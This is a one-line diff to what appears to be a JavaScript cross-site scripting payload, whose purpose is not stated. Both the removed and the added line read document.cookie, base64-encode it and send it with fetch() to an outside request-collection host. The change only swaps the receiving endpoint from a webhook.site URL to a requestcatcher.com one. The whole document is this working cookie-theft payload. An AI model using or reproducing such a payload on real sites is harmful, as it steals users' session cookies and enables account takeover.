@@ -1,1 +1,1 @@
-fetch('https://webhook.site/2086298b-6c54-4b30-851f-e7501b78d2b6?q=' + btoa(document.cookie));
+fetch('https://l.requestcatcher.com/leak?q=' + btoa(document.cookie));
